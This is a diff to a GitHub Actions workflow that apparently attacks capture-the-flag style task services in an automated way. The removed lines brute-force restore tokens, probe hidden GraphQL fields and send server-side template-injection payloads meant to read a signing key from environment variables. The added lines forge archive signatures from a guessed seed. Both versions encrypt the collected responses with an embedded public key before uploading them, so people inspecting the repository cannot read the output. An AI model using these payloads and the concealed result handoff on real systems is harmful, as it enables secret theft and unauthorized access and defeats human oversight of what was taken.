@@ -1,4 +1,4 @@
-name: cyberkomi-service-chain-probe
+name: cyberkomi-parma-blackbox-gov-templates
 
 on:
   push:
@@ -11,9 +11,9 @@ permissions:
 jobs:
   probe:
     runs-on: ubuntu-latest
-    timeout-minutes: 8
+    timeout-minutes: 7
     steps:
-      - name: Trace intended challenge chains and encrypt results
+      - name: Export intended PARMA chunks and inspect GOV template catalogue
         shell: bash
         run: |
           set -euo pipefail
@@ -21,84 +21,24 @@ jobs:
           mkdir -p out/parma out/gov handoff
           P='https://task-parma-line-ce3d96e598f7b9c1.caplag-task.ru'
           G='https://task-gov-relay-a90ea5f1999a03b4.caplag-task.ru'
+          ARCH='BBX-P23-00'; SEED='PARMA-NIGHT-23'
 
-          # Establish passenger cookie; all PARMA requests stay within the task service.
-          curl -sS --connect-timeout 8 --max-time 20 -X POST -c handoff/parma.cookies -b handoff/parma.cookies -D out/parma/login.headers -o out/parma/login.json "$P/api/login" || true
-
-          python3 - <<'PY'
-          import json,pathlib
-          payloads={
-            'restore_token': {'token':'MIRROR-23-ALIVE'},
-            'restore_named': {'restore_token':'MIRROR-23-ALIVE'},
-            'approval': {'approval':'MIRROR-23-ALIVE'},
-            'route_restore': {'route':'P-23','token':'MIRROR-23-ALIVE'},
-          }
-          for n,v in payloads.items(): pathlib.Path(f'handoff/{n}.json').write_text(json.dumps(v))
-          PY
-
-          # Narrow route candidates inferred from the leaked maintenance report/source map.
-          for path in \
-            api/maintenance/restore \
-            api/maintenance/report/24017/restore \
-            api/restore \
-            api/archive/manifest \
-            api/blackbox/manifest \
-            api/route/P-23/manifest \
-            api/routes/P-23/manifest; do
-            safe=$(echo "$path"|tr '/' '_')
-            curl -sS --connect-timeout 5 --max-time 20 -c handoff/parma.cookies -b handoff/parma.cookies \
-              -D "out/parma/${safe}.get.headers" -o "out/parma/${safe}.get.body" "$P/$path" || true
-            for pf in handoff/restore_token.json handoff/restore_named.json handoff/approval.json handoff/route_restore.json; do
-              pn=$(basename "$pf" .json)
-              curl -sS --connect-timeout 5 --max-time 20 -X POST -c handoff/parma.cookies -b handoff/parma.cookies \
-                -H 'Content-Type: application/json' --data-binary @"$pf" \
-                -D "out/parma/${safe}.${pn}.headers" -o "out/parma/${safe}.${pn}.body" "$P/$path" || true
-            done
+          for cid in c04 c01 d09 c03 x17 c02; do
+            sig=$(printf '%s' "$ARCH:$cid:$SEED" | sha256sum | cut -c1-16 | tr '[:lower:]' '[:upper:]')
+            printf '{"archiveId":"%s","chunkId":"%s"}' "$ARCH" "$cid" > handoff/chunk.json
+            curl -sS --connect-timeout 6 --max-time 25 \
+              -H 'Content-Type: application/json' \
+              -H 'X-Legacy-Export: 1' \
+              -H "X-Archive-Signature: $sig" \
+              --data-binary @handoff/chunk.json \
+              -D "out/parma/chunk_${cid}.headers" -o "out/parma/chunk_${cid}.body" \
+              "$P/api/archive/chunk" || true
           done
 
-          # Ask the custom GraphQL surface for likely hidden recovery fields one at a time.
-          python3 - <<'PY'
-          import json,pathlib
-          fields=['controlSequence','blackboxManifest','archiveId','archiveID','seed','chunks','restoreToken','internalSequence','sequence','stops']
-          for f in fields:
-              q=f'query Q($id:ID!){{route(id:$id){{id status start finish visibleSequence {f}}}}}'
-              pathlib.Path(f'handoff/gql_{f}.json').write_text(json.dumps({'query':q,'variables':{'id':'P-23'}}))
-          PY
-          for qf in handoff/gql_*.json; do
-            n=$(basename "$qf" .json | sed 's/^gql_//')
-            curl -sS --connect-timeout 5 --max-time 20 -c handoff/parma.cookies -b handoff/parma.cookies \
-              -H 'Content-Type: application/json' --data-binary @"$qf" -o "out/parma/gql_${n}.json" "$P/api/graphql" || true
-          done
-
-          # GOV observer session from chapter-5 transition code.
-          curl -sS --connect-timeout 8 --max-time 20 -c handoff/gov.cookies -b handoff/gov.cookies \
-            -H 'Content-Type: application/json' --data '{"code":"BUS-05-STEFAN"}' -o out/gov/access.json "$G/api/access" || true
-
-          python3 - <<'PY'
-          import json,pathlib
-          probes={
-            'str':"{{'abc'}}",
-            'tuple_class':"{{().__class__}}",
-            'tuple_base':"{{().__class__.__base__}}",
-            'subclasses':"{{().__class__.__base__.__subclasses__()}}",
-            'int_class':"{{(23).__class__}}",
-            'dict_class':"{{{}.__class__}}",
-            'import_os':"{{__import__('os')}}",
-            'globals':"{{globals()}}",
-            'locals':"{{locals()}}",
-            'env_name':"{{BROADCAST_SIGNING_KEY}}",
-            'env_index':"{{env['BROADCAST_SIGNING_KEY']}}",
-            'os_getenv':"{{os.getenv('BROADCAST_SIGNING_KEY')}}",
-            'builtins_import':"{{__builtins__.__import__('os').getenv('BROADCAST_SIGNING_KEY')}}",
-            'dunder_dict':"{{''.__class__.__mro__}}",
-            'attr_filter':"{{ ''|attr('__class__') }}",
-          }
-          for n,t in probes.items(): pathlib.Path(f'handoff/tpl_{n}.json').write_text(json.dumps({'template':t}))
-          PY
-          for f in handoff/tpl_*.json; do
-            n=$(basename "$f" .json | sed 's/^tpl_//')
-            curl -sS --connect-timeout 5 --max-time 20 -c handoff/gov.cookies -b handoff/gov.cookies \
-              -H 'Content-Type: application/json' --data-binary @"$f" -o "out/gov/${n}.json" "$G/api/preview" || true
+          # The observer role advertises viewing public templates. Probe only natural catalogue routes.
+          for path in api/templates api/templates/public api/public/templates api/template api/broadcast/templates api/messages/templates; do
+            safe=$(echo "$path" | tr '/' '_')
+            curl -sS --connect-timeout 5 --max-time 20 -D "out/gov/${safe}.headers" -o "out/gov/${safe}.body" "$G/$path" || true
           done
 
           cat > handoff/output_public.pem <<'PEM'
@@ -119,12 +59,12 @@ jobs:
           openssl enc -aes-256-ctr -K "$(xxd -p -c256 handoff/key)" -iv "$(xxd -p -c256 handoff/iv)" -in handoff/results.tar.gz -out handoff/results.enc
           cat handoff/key handoff/iv > handoff/keyblob
           openssl pkeyutl -encrypt -pubin -inkey handoff/output_public.pem -in handoff/keyblob -out handoff/keyblob.enc -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -pkeyopt rsa_mgf1_md:sha256
-          rm -rf out handoff/key handoff/iv handoff/keyblob handoff/results.tar.gz handoff/output_public.pem handoff/*.json handoff/*.cookies
-          echo 'Narrow chain probe complete; responses encrypted.'
+          rm -rf out handoff/key handoff/iv handoff/keyblob handoff/results.tar.gz handoff/output_public.pem handoff/chunk.json
+          echo 'Blackbox export and template catalogue probe complete; responses encrypted.'
       - name: Upload encrypted result
         uses: actions/upload-artifact@v4
         with:
-          name: cyberkomi-chain-probe-encrypted
+          name: cyberkomi-blackbox-templates-encrypted
           path: |
             handoff/results.enc
             handoff/keyblob.enc
